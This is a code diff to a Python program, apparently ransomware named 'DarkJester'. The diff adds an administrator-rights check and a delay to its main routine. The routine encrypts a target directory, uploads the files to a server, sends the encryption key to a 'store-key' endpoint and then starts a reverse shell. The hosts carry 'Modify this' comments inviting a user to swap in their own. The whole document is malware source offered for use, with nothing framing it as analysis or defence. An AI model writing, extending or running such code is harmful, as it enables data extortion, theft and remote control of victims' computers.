@@ -12,9 +12,11 @@ import requests
 import socket
 import threading
 import subprocess as sp
+import ctypes
 import platform
 from concurrent.futures import ThreadPoolExecutor
 import re
+import time
 
 class DarkJester:
     def __init__(self, key_size=32, iv_size=16):
@@ -136,11 +138,20 @@ class ReverseShell:
         proc.wait()
 
 if __name__ == "__main__":
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        ctypes.windll.user32.MessageBoxW(
+            0,
+            "Please run this program as Administrator.", # Modify if needed
+            "Cannot Proceed", # Modify if needed
+            0x10  # MB_ICONERROR
+        )
+        sys.exit(1)
     jester = DarkJester()
     shell = ReverseShell('127.0.0.1', 1234) # Modify this
     server_url = "http://127.0.0.1:5000/upload" # Modify this
     jester.encrypt_directory("path/to/directory", server_url, max_threads=30) # Modify this, adjust thread if needed
     jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
+    time.sleep(10)
     shell.start()
 
 
